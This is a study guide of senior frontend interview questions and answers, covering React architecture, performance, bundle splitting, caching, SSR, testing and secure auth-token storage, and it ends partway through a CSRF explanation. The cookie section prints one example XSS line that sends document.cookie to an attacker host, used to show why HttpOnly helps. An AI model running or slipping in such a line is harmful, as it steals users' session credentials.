# Senior Frontend Web Developer — Advanced Interview Q&A

## Index
| No. | Section                                                                                     |
| --: | ------------------------------------------------------------------------------------------- |
|   1 | [Frontend Architecture](#1-frontend-architecture)                                           |
|   2 | [React Rendering and Reconciliation](#2-react-rendering-and-reconciliation)                 |
|   3 | [React Performance Optimization](#3-react-performance-optimization)                         |
|   4 | [State Management Architecture](#4-state-management-architecture)                           |
|   5 | [Authentication Architecture](#5-authentication-architecture)                               |
|   6 | [Authorization and RBAC](#6-authorization-and-rbac)                                         |
|   7 | [XSS, CSRF and Browser Security](#7-xss-csrf-and-browser-security)                          |
|   8 | [Web Accessibility and ARIA](#8-web-accessibility-and-aria)                                 |
|   9 | [Production Performance Investigation](#9-production-performance-investigation)             |
|  10 | [Core Web Vitals](#10-core-web-vitals)                                                      |
|  11 | [Code Splitting and Bundle Optimization](#11-code-splitting-and-bundle-optimization)        |
|  12 | [Caching Strategy](#12-caching-strategy)                                                    |
|  13 | [API and Network Resilience](#13-api-and-network-resilience)                                |
|  14 | [React Server-Side Rendering](#14-react-server-side-rendering)                              |
|  15 | [Hydration and Mismatch Debugging](#15-hydration-and-mismatch-debugging)                    |
|  16 | [TypeScript Advanced Design](#16-typescript-advanced-design)                                |
|  17 | [JavaScript Event Loop](#17-javascript-event-loop)                                          |
|  18 | [Memory Leaks](#18-memory-leaks)                                                            |
|  19 | [Testing Strategy](#19-testing-strategy)                                                    |
|  20 | [Frontend System Design](#20-frontend-system-design)                                        |
|  21 | [Micro Frontends](#21-micro-frontends)                                                      |
|  22 | [Observability and Error Monitoring](#22-observability-and-error-monitoring)                |
|  23 | [CI/CD and Production Safety](#23-ci-cd-and-production-safety)                              |
|  24 | [Senior-Level Scenario: Slow Production App](#24-senior-level-scenario-slow-production-app) |
|  25 | [Where to store the auth token](#25-where-to-store-the-auth-token)                          |

---

## 1. Frontend Architecture

### Question
How would you design the architecture of a large React application used by multiple teams?

### Answer
I would avoid putting everything into one large component hierarchy. I would define boundaries around business domains.

A typical structure could be:

```text
src/
  app/
  features/
    authentication/
    users/
    payments/
    reports/
  shared/
    components/
    hooks/
    utils/
    types/
  services/
    api/
  store/
```

My main principles would be:

- Feature-based organization rather than only file-type-based organization.
- Clear separation between UI, business logic, API access and state.
- Reusable shared components should contain generic behavior, not business-specific behavior.
- API calls should be centralized behind service/query layers.
- Global state should contain only genuinely global data.
- Local UI state should remain local.
- Establish dependency direction so low-level shared modules do not depend on feature modules.

For a senior-level application, I would also define architectural rules through TypeScript, lint rules, code ownership and CI checks.

The goal is not just clean folders. The goal is **low coupling, high cohesion and predictable ownership**.

---

## 2. React Rendering and Reconciliation

### Question
What exactly causes a React component to re-render, and how would you debug unnecessary renders?

### Answer
A component can re-render when:

- Its state changes.
- Its parent renders and React renders the child again.
- A consumed context value changes.
- A subscribed external store changes.
- Its props change as part of the rendering process.

A re-render does not automatically mean a DOM update. React first creates the new element tree and compares it with the previous tree during reconciliation. Only the required DOM changes are committed.

To debug unnecessary renders, I would use:

- React DevTools Profiler
  - Go to Profiler in dev tools.
  - click record and do something on ui.
  - the compnoent which is getting re-rendered will get hilighted with box.
  - this will also provide which particular hook, props, state was the cause of the re-render.
- Component render tracking during development.
- Inspection of changing props.
- Checking context providers that update too frequently.
- Checking whether parent components create new object/function references on every render.

For example:

```tsx
const value = { user, permissions };
```

creates a new object every render. If this is passed through context, consumers can re-render unnecessarily.

I would not blindly use `useMemo` or `useCallback`. I would first identify an actual rendering problem and then optimize the expensive boundary.

---

## 3. React Performance Optimization

### Question
Suppose a React application becomes slow after adding several complex features. How would you optimize it?

### Answer
I would first measure rather than immediately optimize.

My process would be:

1. Reproduce the problem in a production-like build.
2. Use React Profiler to identify expensive renders.
3. Use browser Performance tools to identify long tasks.
4. Analyze bundle size and JavaScript execution.
5. Check network requests and waterfalls.
6. Check Core Web Vitals -> Largest Contentful Paint (LCP), Interaction to Next Paint (INP), Cumulative Layout Shift (CLS)
7. Identify whether the problem is CPU, network, rendering, memory or backend latency.

Possible fixes include:

- Route-level code splitting.
- Lazy loading heavy components.
- Virtualizing large lists.
- Avoiding unnecessary renders.
- Memoizing expensive calculations only when useful.
- Moving expensive computation off the main thread where appropriate.
- Optimizing images.
- Reducing JavaScript shipped to the browser.
- Caching API results.
- Removing duplicate requests.
- Prefetching data for predictable navigation.

A senior developer should be able to explain **why** an optimization works and prove the improvement with measurements.

---

## 4. State Management Architecture

### Question
When would you use local state, Context API, Redux Toolkit or a server-state library?

### Answer
I classify state based on ownership.

**Local UI state:**
Modal open/close, selected tab, input state and temporary UI state.

**Context:**
Stable cross-cutting values such as theme, locale or authenticated user information when the update frequency is low.

**Redux Toolkit:**
Complex client-side application state shared across many parts of the application, especially when we need predictable state transitions, middleware, devtools and centralized workflows.

**Server state:**
Data owned by the backend should ideally be handled with a server-state solution such as RTK Query or another query/cache library.

A common mistake is putting every API response into Redux manually. That can create duplicated state, stale data and unnecessary boilerplate.

I prefer this mental model:

```text
UI state       -> component state
Global UI      -> Context / Redux
Client domain  -> Redux Toolkit
Server data    -> query/cache layer
```

---

## 5. Authentication Architecture

### Question
How would you design authentication for a production React application?

### Answer
Authentication answers: **Who are you?**

I would prefer an established identity provider or OAuth 2.0/OpenID Connect flow rather than implementing authentication from scratch.

For a browser application, an important consideration is token storage.

I generally avoid storing long-lived sensitive tokens in `localStorage` because JavaScript-accessible storage can be exposed if an XSS vulnerability exists.

A stronger design is:

- Short-lived access token.
- Refresh token protected using a secure, `HttpOnly`, `Secure` cookie when the architecture supports it.
- Appropriate `SameSite` policy.
- HTTPS everywhere.
- Server-side token validation.
- Token rotation/revocation strategy where appropriate.
- Automatic handling of expired sessions.
- Redirect users to login without exposing sensitive information in URLs.

The frontend should treat authentication state as an indication of session status, not as the ultimate security boundary.

**The backend must always validate authentication.**

---

## 6. Authorization and RBAC

### Question
What is the difference between authentication and authorization? How would you implement role-based access control?

### Answer
Authentication means **identity verification**.

Authorization means **what that identity is allowed to do**.

For example:

```text
Authentication:
User = Pratik

Authorization:
Pratik can:
- View reports
- Edit users
- Cannot delete users
```

In React, I might have route-level authorization:

```tsx
<Route
  path="/admin"
  element={
    <ProtectedRoute permission="admin.read">
      <AdminPage />
    </ProtectedRoute>
  }
/>
```

But this is only a UX/security-layer optimization.

The backend must enforce the same permission:

```text
GET /admin
        |
        v
Authenticate user
        |
        v
Check permission
        |
        +---- allowed -> data
        |
        +---- denied  -> 403
```

I prefer permission-based authorization over hardcoding role checks everywhere because permissions are more flexible.

For example:

```text
admin -> users.read + users.write + users.delete
manager -> users.read + users.write
viewer -> users.read
```

---

## 7. XSS, CSRF and Browser Security

### Question
Explain XSS and CSRF and how you would protect a React application.

### Answer
**XSS — Cross-Site Scripting**

An attacker injects executable JavaScript into a page that executes in another user's browser.

React escapes normal JSX values by default, which provides protection in common cases. However, risks return when using APIs such as:

```tsx
dangerouslySetInnerHTML
```

If HTML must be rendered, I would sanitize it using a well-maintained sanitizer and avoid accepting arbitrary HTML whenever possible.

Additional protections include:

- Content Security Policy.
- Secure dependency management.
- Output encoding.
- Avoiding unsafe DOM APIs.
- Avoiding evaluating arbitrary strings as JavaScript.

**CSRF — Cross-Site Request Forgery**

The attacker tricks a user's browser into sending an authenticated request to another site.

If authentication relies on cookies, protections include:

- `SameSite` cookies.
- CSRF tokens where required.
- Origin/Referer validation where appropriate.
- Proper CORS configuration.

CORS is **not** a replacement for CSRF protection.

---

## 8. Web Accessibility and ARIA

### Question
What is ARIA, and how would you make a complex React application accessible?

### Answer
ARIA stands for **Accessible Rich Internet Applications**.

It provides semantic information to assistive technologies when native HTML semantics are insufficient.

My first rule is:

> Use native HTML before ARIA.

For example, I prefer:

```html
<button>Save</button>
```

instead of:

```html
<div role="button">Save</div>
```

For a custom modal, I would consider:

- Appropriate dialog semantics.
- Accessible name.
- Keyboard focus management.
- Focus trapping where appropriate.
- Restoring focus to the triggering element.
- Escape-key behavior.
- Correct tab order.

For dynamic content, I may use live regions such as:

```html
<div aria-live="polite">
  Profile saved successfully.
</div>
```

I would also test with:

- Keyboard-only navigation.
- Screen readers.
- Browser accessibility tools.
- Automated accessibility testing.

ARIA should enhance semantics; it should not compensate for poor HTML structure.

---

## 9. Production Performance Investigation

### Question
The application is fast locally but slow in production. How would you investigate?

### Answer
I would not assume React is the problem.

I would compare:

```text
Local development
        vs
Production build
        vs
Real user monitoring
```

I would inspect:

- Bundle size.
- Compression.
- CDN configuration.
- Cache headers.
- API latency.
- DNS/TLS connection time.
- TTFB.
- JavaScript execution time.
- Long tasks.
- Image size.
- Third-party scripts.
- Core Web Vitals.
- Device/network differences.

I would use browser DevTools, Lighthouse, performance traces and real-user monitoring.

For example, if TTFB is high, optimizing React components will not solve the primary problem.

If TTFB is good but the main thread is blocked for 3 seconds, then I would investigate JavaScript execution and rendering.

This is an important senior-level distinction:

> **Measure the bottleneck before changing the architecture.**

---

## 10. Core Web Vitals

### Question
Explain LCP, INP and CLS and how you would improve them.

### Answer
**LCP — Largest Contentful Paint**

Measures how quickly the main visible content becomes available.

Possible improvements:

- Optimize critical images.
- Preload important resources carefully.
- Reduce render-blocking resources.
- Improve server response time.
- Reduce client-side JavaScript.

**INP — Interaction to Next Paint**

Measures responsiveness to user interactions.

Possible improvements:

- Reduce long JavaScript tasks.
- Split expensive work.
- Avoid unnecessary rendering.
- Virtualize large lists.
- Move CPU-heavy work away from the main thread when appropriate.

**CLS — Cumulative Layout Shift**

Measures unexpected layout movement.

Common fixes:

- Reserve image dimensions.
- Reserve space for dynamic content.
- Avoid inserting content above existing content.
- Use stable layout structures.

I would track these using real-user data as well as lab tools because real users experience different devices and networks.

---

## 11. Code Splitting and Bundle Optimization

### Question
How would you reduce the initial JavaScript bundle of a large React application?

### Answer
I would start by analyzing the bundle rather than randomly removing packages.

I would consider:

- Route-level lazy loading.
- Component-level lazy loading for expensive features.
- Dynamic imports.
- Tree-shaking.
- Removing unused dependencies.
- Replacing oversized libraries.
- Importing only required modules.
- Deferring non-critical third-party scripts.

The main idea is: **don't try to make every JavaScript file smaller individually. First find out what is making the initial bundle large, then prevent code that isn't needed immediately from being downloaded and executed.**

Think of a large React application with:

* Home page
* Product pages
* Checkout
* Admin dashboard
* Analytics
* Rich text editor
* Charts
* Maps

You don't want a user visiting `/home` to download JavaScript for the **admin dashboard, charts, editor, maps, and checkout** before they need them.

## 1. Analyze the Bundle First

Before changing anything, inspect the production bundle using tools such as:

* Webpack Bundle Analyzer
* `source-map-explorer`
* Rollup/Vite visualizers
* Chrome DevTools Coverage

For example:

```text
main.js — 3.5 MB

lodash                 500 KB
moment                 300 KB
charting library       700 KB
rich text editor       600 KB
application code       900 KB
```

Now you know where the problem actually is.

This is important in an interview because saying "I'll remove unused code" without measuring it isn't a good optimization strategy.

## 2. Route-Level Lazy Loading

This is usually one of the **highest-impact optimizations**.

Suppose your application has:

```text
/home
/products
/checkout
/admin
/reports
```

Without lazy loading, the browser might download JavaScript for all of these routes when the application starts.

Instead, load each route when the user needs it.

With React:

```jsx
const Admin = React.lazy(() => import("./pages/Admin"));
const Reports = React.lazy(() => import("./pages/Reports"));
```

Then:

```jsx
<Suspense fallback={<Loading />}>
  <Routes>
    <Route path="/admin" element={<Admin />} />
    <Route path="/reports" element={<Reports />} />
  </Routes>
</Suspense>
```

The build system creates separate chunks:

```text
main.js
admin.chunk.js
reports.chunk.js
```

A user visiting `/home` doesn't initially need:

```text
admin.chunk.js
reports.chunk.js
```

So the **initial JavaScript payload becomes smaller**.

### Interview explanation

> "I would split the application by routes so users only download JavaScript for the route they're actually visiting."

## 3. Component-Level Lazy Loading

Sometimes the entire route doesn't need to be loaded upfront.

Imagine a product page:

```text
Product page
 ├── Product information
 ├── Reviews
 ├── Recommendations
 ├── 3D product viewer
 └── Analytics chart
```

The 3D viewer might be 1 MB, but most users may never open it.

Instead of:

```jsx
import ProductViewer from "./ProductViewer";
```

you could do:

```jsx
const ProductViewer = React.lazy(
  () => import("./ProductViewer")
);
```

Then load it when the user opens the viewer.

This is **component-level code splitting**.

## 4. Dynamic Imports

`React.lazy()` is one use case of dynamic imports.

You can also dynamically import something when an event happens:

```jsx
async function openEditor() {
  const { Editor } = await import("./Editor");

  // use Editor
}
```

Or:

```jsx
button.addEventListener("click", async () => {
  const module = await import("./heavy-feature");
  module.start();
});
```

This means:

> "Don't download this code until I actually need it."

This is particularly useful for:

* PDF viewers
* Charts
* Maps
* Rich text editors
* Syntax highlighting
* Large admin features
* Rarely used modals

## 5. Tree-Shaking

Tree-shaking means removing code that you import but don't actually use.

Suppose a library contains:

```js
export function add() {}
export function subtract() {}
export function multiply() {}
export function divide() {}
```

If you only use:

```js
import { add } from "./math";
```

a modern bundler can potentially remove the unused functions.

But how you import libraries matters.

For example, instead of:

```js
import _ from "lodash";

_.debounce(...);
```

you may prefer:

```js
import debounce from "lodash/debounce";
```

This can make it easier for the bundler to include only what you need, depending on the library and build setup.

Tree-shaking works best when dependencies are designed to be tree-shakeable, commonly using ES modules.

## 6. Remove Unused Dependencies

Sometimes the easiest optimization is simply:

> **Don't ship code you don't use.**

For example, your `package.json` might contain:

```text
moment
lodash
date-fns
some-old-chart-library
old-ui-library
```

but perhaps the application no longer uses some of them.

Remove them.

Also check for dependencies that are used only by a small feature. Those might be good candidates for dynamic imports rather than being included in the initial bundle.

## 7. Replace Oversized Libraries

This is a very common real-world optimization.

Suppose you're using a large date library for one simple operation:

```js
formatDate(date)
```

but the library adds hundreds of KB to the application.


I would also check whether dependencies are accidentally duplicated and whether a library has a smaller alternative.

You might replace it with a smaller alternative or native APIs where appropriate.

Similarly:

```text
Large chart library → smaller chart library
Large utility library → small utility/native implementation
Large date library → lighter alternative
```

The important point is **measure the tradeoff**. Don't blindly replace libraries just because they're large; functionality, browser support, maintenance, and performance also matter.

## 8. Import Only What You Need

Imagine a library exposes:

```js
import {
  Button,
  Modal,
  Table,
  DatePicker,
  Chart
} from "large-ui-library";
```

If the library/bundler setup doesn't tree-shake effectively, you might accidentally ship much more code than necessary.

Prefer library-specific imports when supported:

```js
import Button from "large-ui-library/Button";
```

The exact approach depends on the library.

This is why I would inspect the generated bundle rather than assuming imports are optimized.

## 9. Defer Third-Party Scripts

Third-party scripts can significantly affect startup performance.

Examples include:

```text
Google Analytics
Chat widgets
Customer support widgets
A/B testing
Advertising
Heatmaps
Social media widgets
```

You don't necessarily need all of them before the application becomes interactive.

For example, a chat widget doesn't need to block your main application from loading.

You can load it:

```text
after the page becomes interactive
after a delay
after user interaction
on specific routes only
```

Instead of:

```text
HTML
 ↓
Analytics
 ↓
Chat widget
 ↓
A/B testing
 ↓
React
 ↓
Page becomes interactive
```

you want something closer to:

```text
HTML
 ↓
React
 ↓
Page becomes interactive
 ↓
load non-critical third-party scripts
```

# Putting Everything Together

Imagine your initial bundle currently looks like:

```text
Initial JavaScript = 4 MB

React application       1.0 MB
Admin dashboard          0.8 MB
Charts                   0.7 MB
Rich text editor         0.6 MB
Date library             0.3 MB
Other dependencies       0.6 MB
```

After optimization, you might get:

```text
Initial JavaScript = 1.2 MB

Core application         0.8 MB
Required dependencies    0.4 MB

Lazy-loaded:
  Admin dashboard        0.8 MB
  Charts                 0.7 MB
  Rich text editor       0.6 MB
```

The total application JavaScript hasn't necessarily disappeared.

Instead, you've changed **when it gets downloaded**.

That's the key concept.

# Strong Interview Answer

> "First, I would measure the production bundle using a bundle analyzer to identify the largest contributors. Then I'd focus on reducing the amount of JavaScript required for the initial render. I'd use route-level and component-level code splitting with dynamic imports, so expensive features are loaded only when needed. I'd make sure tree-shaking is effective and remove unused dependencies or replace unnecessarily large libraries. I'd also check whether we're importing entire libraries when we only need a small part of them. Finally, I'd defer non-critical third-party scripts such as analytics, chat widgets, or experimentation tools. After each change, I'd measure the impact using bundle size and real user performance metrics rather than optimizing blindly."

# Senior-Level Insight

The most important distinction is:

**Bundle size optimization ≠ just deleting JavaScript.**

You generally want to optimize:

**Initial JavaScript**

rather than necessarily minimizing:

**Total JavaScript in the entire application.**

A 5 MB application can be perfectly reasonable if the user initially downloads only 500 KB and the remaining 4.5 MB is loaded later when required.

That is essentially what **code splitting + lazy loading + dependency optimization** are trying to achieve.

The goal is not simply "smallest bundle." The goal is **fast delivery and fast execution of the critical path**.

---

## 12. Caching Strategy

### Question
How would you design caching for frontend API data?

### Answer
I would distinguish between different types of caching:

```text
Browser cache
CDN cache
HTTP cache
Application/query cache
Service worker cache
Backend cache
```

For API data, I would consider:

- Cache lifetime.
- Stale-while-revalidate behavior.
- Cache invalidation.
- Request deduplication.
- Pagination.
- Optimistic updates.
- Refetch triggers.

For example, translations may be cached using a key such as:

```text
languageId + tagName
```

If the same language/tag combination is requested again, the application can reuse cached data instead of making another request.

The difficult part of caching is invalidation.

I would ask:

> When the source data changes, how does the client know that its cached value is stale?

A cache without an invalidation strategy can create correctness problems.

---

## 13. API and Network Resilience

### Question
How would you make a frontend resilient to unreliable APIs?

### Answer
I would handle:

- Loading states.
- Error states.
- Empty states.
- Timeouts.
- Retries for appropriate failures.
- Request cancellation.
- Race conditions.
- Duplicate requests.
- Offline/poor-network scenarios where relevant.

I would not blindly retry every request.

For example, retrying a failed `GET` may be reasonable in some cases, but automatically retrying a non-idempotent operation can create duplicate side effects.

For search requests, I would combine debouncing with request cancellation.

If the user searches:

```text
react
react hooks
react hooks interview
```

I don't want stale responses arriving out of order and overwriting the newest result.

AbortController can help cancel obsolete requests.

---

## 14. React Server-Side Rendering

### Question
When would you choose SSR, CSR, SSG or a hybrid approach?

### Answer
**CSR** renders primarily in the browser. It is useful for highly interactive authenticated applications where SEO is less important.

**SSR** generates HTML on the server for each request. It can improve initial content delivery and SEO, but introduces server complexity.

**SSG** generates pages ahead of time. It works very well for content that does not change frequently.

**Hybrid rendering** allows different routes to use different strategies.

For example:

```text
Marketing pages -> SSG
Product pages   -> SSR/ISR
Admin dashboard -> CSR
```

I would choose based on:

- SEO requirements.
- Content freshness.
- Traffic.
- Server cost.
- User-perceived performance.
- Data requirements.
- Application complexity.

There is no universal "SSR is better" answer.

---

## 15. Hydration and Mismatch Debugging

### Question
What is hydration, and what causes hydration mismatch errors?

### Answer
In an SSR application, the server sends HTML. React then runs on the client and attaches behavior to that existing HTML.

This process is hydration.

A hydration mismatch occurs when the server-rendered output differs from what the client initially renders.

Common causes include:

- Using `Date.now()` during rendering.
- Random values during rendering.
- Reading browser-only APIs during server rendering.
- Different data between server and client.
- Locale/timezone differences.
- Conditional rendering based directly on `window`.

I would ensure the initial server and client render are deterministic.

Browser-only behavior can often move into an effect:

```tsx
useEffect(() => {
  // Browser-only logic
}, []);
```

But I would not use effects blindly to hide mismatches; I would identify and fix the underlying difference.

---

## 16. TypeScript Advanced Design

### Question
How do you use TypeScript to make a large frontend codebase safer?

### Answer
I use TypeScript to model domain boundaries rather than just adding types to function parameters.

Important techniques include:

- Discriminated unions.
- Generics.
- Utility types.
- Type narrowing.
- Branded types where useful.
- Strict compiler settings.
- Exhaustive checking.

For example:

```ts
type ApiState<T> =
  | { status: "loading" }
  | { status: "success"; data: T }
  | { status: "error"; message: string };
```

Now TypeScript can enforce that the UI handles each state correctly.

I also avoid excessive `any`.

If an API response is unknown, I prefer:

```ts
unknown
```

and validate/narrow it before using it.

TypeScript provides compile-time safety, but it does not validate runtime data from an API. Runtime validation is still required at trust boundaries when correctness/security depends on the input.

---

## 17. JavaScript Event Loop

### Question
Explain the event loop and why microtasks can affect UI responsiveness.

### Answer
JavaScript runs application code on the main thread in a single execution context.

The browser manages tasks such as:

```text
Task
  -> Microtasks
  -> Rendering opportunity
  -> Next task
```

Promises use the microtask queue.

For example:

```js
console.log("A");

setTimeout(() => console.log("B"), 0);

Promise.resolve().then(() => console.log("C"));

console.log("D");
```

Output:

```text
A
D
C
B
```

The important production consideration is that a large amount of synchronous JavaScript or chained microtasks can block the browser from reaching rendering.

Therefore, even asynchronous-looking code can contribute to UI freezes if it continuously occupies the main thread.

For CPU-heavy work, I may consider Web Workers or breaking work into smaller chunks.

---

## 18. Memory Leaks

### Question
What causes memory leaks in React applications?

### Answer
Common causes include:

- Event listeners not removed.
- Timers not cleared.
- Subscriptions not unsubscribed.
- WebSocket connections left open.
- Observers not disconnected.
- References retaining large objects.
- Long-lived caches without eviction.
- Async operations retaining unnecessary component-related state.

Example:

```tsx
useEffect(() => {
  const handler = () => {
    // logic
  };

  window.addEventListener("resize", handler);

  return () => {
    window.removeEventListener("resize", handler);
  };
}, []);
```

I would investigate memory leaks using browser heap snapshots and allocation timelines.

A growing heap after repeated navigation to and from the same page is a strong signal that something is being retained.

---

## 19. Testing Strategy

### Question
What testing strategy would you use for a large frontend application?

### Answer
I prefer a testing pyramid rather than testing everything through end-to-end tests.

**Unit tests:**
Pure functions and isolated business logic.

**Component/integration tests:**
Test components interacting with state, APIs and user behavior.

**E2E tests:**
Critical end-to-end user journeys.

Examples of critical E2E flows:

```text
Login
Checkout
Payment
Booking
Admin permission flow
```

I prefer testing user behavior rather than implementation details.

For example, I would prefer:

```text
User clicks "Save"
-> success message appears
```

rather than asserting internal state variables.

For API-heavy applications, I would also mock network behavior at the network boundary rather than deeply mocking implementation internals.

---

## 20. Frontend System Design

### Question
Design the frontend architecture for a high-traffic e-commerce application.

### Answer
I would break the application into domains:

```text
Product
Search
Cart
Checkout
Authentication
Orders
Payments
```

A possible architecture:

```text
                CDN
                 |
          React Web App
                 |
      -----------------------
      |         |           |
   Search     Product      Cart
      |         |           |
      -------- API Gateway -
                 |
      ----------------------
      |        |           |
 Product    Inventory    Order
 Service     Service     Service
```

Frontend concerns would include:

- Route-level code splitting.
- Server-state caching.
- Optimistic cart updates where appropriate.
- Error boundaries.
- Authentication.
- Permission handling.
- Analytics.
- Accessibility.
- Observability.
- Feature flags.

I would also design for failure.

For example, if recommendations fail, checkout should not necessarily fail.

That means features should have appropriate isolation and graceful degradation.

---

## 21. Micro Frontends

### Question
When would you choose micro frontends, and what problems can they introduce?

### Answer
I would consider micro frontends when multiple autonomous teams need to independently own and deploy major business domains.

Benefits:

- Team autonomy.
- Independent deployments.
- Domain ownership.
- Potentially independent technology evolution.

Problems include:

- Duplicate dependencies.
- Inconsistent UX.
- Shared state complexity.
- Routing complexity.
- Authentication coordination.
- Performance overhead.
- Deployment complexity.
- Cross-application communication.

I would not introduce micro frontends simply because the application is large.

A modular monolith is often easier to maintain.

The organizational problem should justify the architectural complexity.

---

## 22. Observability and Error Monitoring

### Question
How would you monitor a React application in production?

### Answer
I would use three major areas:

```text
Logs
Metrics
Traces
```

For frontend applications, I would additionally track:

- JavaScript exceptions.
- Error boundaries.
- Failed API requests.
- Core Web Vitals.
- Route performance.
- User/session impact.
- Release version.
- Browser/device information.
- Source maps for debugging minified production errors.

I would also attach useful context such as:

```text
release = 2026.08.23
route = /checkout
user/session context = non-sensitive identifier
```

I would avoid logging passwords, tokens, payment information or other sensitive data.

A good monitoring system should answer:

> Who is affected, how badly, since which release, and what changed?

---

## 23. CI/CD and Production Safety

### Question
What checks would you include before deploying a React application to production?

### Answer
A production pipeline could include:

```text
Install
  ↓
Lint
  ↓
Type check
  ↓
Unit tests
  ↓
Build
  ↓
Bundle-size checks
  ↓
Integration/E2E tests
  ↓
Security/dependency checks
  ↓
Deploy
  ↓
Smoke tests
  ↓
Monitor
```

For higher-risk applications I would also use:

- Feature flags.
- Canary deployments.
- Blue/green deployment where appropriate.
- Automated rollback.
- Environment-specific configuration.
- Approval gates for sensitive releases.

I also prefer immutable builds: the artifact tested should be the artifact deployed.

---

## 24. Senior-Level Scenario: Slow Production App

### Question
Your React application has a sudden 40% increase in page-load time after a release. What do you do?

### Answer
First, I would establish whether the issue is real and which users are affected.

I would compare:

```text
Before release
vs
After release
```

Then check:

1. Real-user performance metrics.
2. Error rates.
3. API latency.
4. TTFB.
5. JavaScript bundle changes.
6. Long tasks.
7. LCP/INP/CLS.
8. Third-party scripts.
9. CDN/cache behavior.
10. Device/browser distribution.

If the regression started exactly with the release, I would inspect the release diff and bundle analysis.

If a rollback restores performance, I have strong evidence that the release caused the regression.

Then I would isolate the change, fix it, add a regression test or performance budget, and redeploy.

For a severe production regression, I would prioritize restoring service first and root-cause analysis second.

A senior engineer should not spend an hour optimizing code while users are experiencing a production outage if a safe rollback is available.

---

## 25. Where to store the auth token

### Question:
Where should we store the authentication token?

### Answer:

Use a Secure, HttpOnly cookie for the session/refresh token.

```jsx
Browser
   |
   | HTTPS
   ↓
HttpOnly + Secure + SameSite Cookie
   |
   ↓
Backend
```

Example response from the server:
The confusing part is that `Set-Cookie` is an HTTP response header, not JavaScript code.
```http
Set-Cookie: session=abc123;
  HttpOnly;
  Secure;
  SameSite=Lax;
  Path=/
```

Then the browser automatically sends the cookie with requests:
```http
GET /api/profile
Cookie: session=abc123
```

JavaScript cannot read the HttpOnly cookie:
```js
document.cookie // session isn't accessible
```
That's valuable because an XSS vulnerability is less likely to directly expose the session token.

What about localStorage?

You can store a token there:
```js
localStorage.setItem("token", token);
```
but it is generally a worse choice for sensitive authentication credentials because JavaScript can read it. If an attacker achieves XSS, they may be able to extract the token.

So I would generally rank the approaches:

| Storage                      | Recommendation                                   |
| ---------------------------- | ------------------------------------------------ |
| **HttpOnly + Secure cookie** | ✅ Preferred for session/refresh credentials      |
| `localStorage`               | ⚠️ Avoid for sensitive auth tokens when possible |
| `sessionStorage`             | ⚠️ Same XSS concern                              |
| Plain JS variable            | ⚠️ Not persistent; still accessible to JS        |
| URL/query parameter          | ❌ Never for auth tokens                          |


### Question:
What about access tokens?

### Answer:

A common architecture is:
```jsx
Login
  ↓
Backend creates session/refresh credential
  ↓
HttpOnly Secure cookie
  ↓
Frontend calls API
  ↓
Backend authenticates request
```

If your architecture specifically uses short-lived access tokens, another pattern is to keep the access token in memory and use an HttpOnly cookie for the refresh/session mechanism:
```jsx
HttpOnly cookie
     ↓
Refresh/session credential

Memory
     ↓
Short-lived access token
```

The exact choice depends on your authentication architecture, CSRF protections, API design, and whether you're using same-origin or cross-origin requests.


### Senior interview answer

> "I would generally avoid putting long-lived authentication credentials in localStorage because JavaScript can access them during an XSS attack. For a browser application, I'd prefer a Secure, HttpOnly, appropriately SameSite cookie for the session or refresh credential. If using access tokens, I may keep short-lived access tokens in memory and use the HttpOnly cookie to obtain new ones. The backend must still enforce authentication and authorization."

### Question:
What is `Set-Cookie`?

### Answer:
Let's go step by step.

### 1. User logs in

Your frontend sends:

```http
POST /login
email: alice@gmail.com
password: ******
```

The backend verifies the credentials.

If they're correct, the backend creates a session/token:

```text
session = abc123
```

### 2. Backend sends it to the browser

The backend responds with:

```http
Set-Cookie: session=abc123;
  HttpOnly;
  Secure;
  SameSite=Lax;
  Path=/
```

Think of `Set-Cookie` as the server saying:

> **"Browser, please save this value as a cookie."**

The browser does that automatically.

You don't need:

```js
localStorage.setItem(...)
```

and you don't need:

```js
document.cookie = ...
```

### 3. What does `HttpOnly` mean?

This is the important part.

```text
HttpOnly
```

means:

> **JavaScript is not allowed to read this cookie.**

So this won't give you the session:

```js
document.cookie
```

But the **browser itself can still send the cookie to your backend**.

That's the key idea.

### 4. User makes another API request

Your React code does:

```js
fetch("/api/profile");
```

The browser automatically attaches the cookie:

```http
GET /api/profile
Cookie: session=abc123
```

Your backend receives:

```text
session = abc123
```

and says:

> "I know this session. This request belongs to Alice."

So your React application doesn't actually need to know the token.

### Think of it like a hotel key 🔑

```text
Login
  ↓
Server gives browser a key
  ↓
Browser stores key
  ↓
Browser automatically shows key to server
  ↓
Server knows who you are
```

React doesn't need to carry the key around.

---

### What do the other options mean?

**Secure**

```text
Secure
```

means the cookie should only be sent over HTTPS.

**SameSite=Lax**

```text
SameSite=Lax
```

helps restrict when the browser sends the cookie in cross-site situations, which is useful for reducing CSRF risk.

**Path=/**

```text
Path=/
```

means the cookie applies to requests under the site's root path.

---

### The big difference

**localStorage approach:**

```text
Login
  ↓
Backend gives token
  ↓
React receives token
  ↓
localStorage stores token
  ↓
React reads token
  ↓
React sends token
```

**HttpOnly cookie approach:**

```text
Login
  ↓
Backend sets cookie
  ↓
Browser stores cookie
  ↓
Browser automatically sends cookie
  ↓
Backend identifies user
```

That's why **HttpOnly cookies are generally preferred for browser authentication credentials**.

A common senior frontend interview follow-up is:

> **Why does `HttpOnly` help against XSS, but not completely solve CSRF?**

The easiest way to understand it is:

> **HttpOnly protects the cookie from being read by JavaScript. It does not stop the browser from sending the cookie.**

That's why it helps with **XSS**, but doesn't completely solve **CSRF**.

### 1. How HttpOnly helps against XSS

Suppose your authentication cookie is:

```http
Set-Cookie: session=abc123; HttpOnly; Secure
```

An attacker manages to inject JavaScript into your application:

```js
fetch("https://attacker.com/steal?token=" + document.cookie);
```

Because the cookie is `HttpOnly`:

```js
document.cookie
```

cannot access:

```text
session=abc123
```

So the attacker can't simply read and steal the session cookie.

```text
XSS
 ↓
Malicious JavaScript
 ↓
document.cookie
 ↓
❌ HttpOnly cookie is inaccessible
```

That's the XSS protection benefit.

### 2. But here's the CSRF problem

Remember:

> **The browser automatically sends cookies.**

Imagine you're logged into:

```text
bank.com
```

Your browser has:

```text
session=abc123
```

Now you visit a malicious website:

```text
evil.com
```

That page could potentially cause your browser to make a request to:

```text
bank.com/transfer
```

The browser may automatically attach your bank's authentication cookie to that request.

The malicious site **doesn't need to read the cookie**.

That's the important distinction.

```text
CSRF:

evil.com
   ↓
causes request to bank.com
   ↓
Browser automatically attaches cookie
   ↓
bank.com sees authenticated request
```

The attacker doesn't need:

```js
document.cookie
```

So `HttpOnly` doesn't prevent this by itself.

### 3. How do we protect against CSRF?

A common defense is a **CSRF token**.

For example:

```text
Browser
   |
   | session cookie
   ↓
Backend
```

